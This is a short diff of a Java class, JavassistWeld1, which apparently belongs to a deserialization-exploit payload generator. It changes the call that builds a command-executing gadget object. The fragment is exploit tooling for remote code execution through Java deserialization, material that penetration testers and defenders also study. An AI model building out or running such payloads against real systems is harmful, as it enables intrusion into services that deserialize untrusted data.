@@ -42,7 +42,7 @@ public class JavassistWeld1 implements CommandObjectPayload<Object>
 
 	public Object getObject(final String command) throws Exception {
 
-		final Object gadget = Gadgets.createTemplatesImpl(command);
+		final Object gadget = Gadgets.createTemplates4Cmd(command);
 
 		InterceptionModelBuilder builder              = InterceptionModelBuilder.newBuilderFor(HashMap.class);
 		ReflectiveClassMetadata  metadata             = (ReflectiveClassMetadata) ReflectiveClassMetadata.of(HashMap.class);
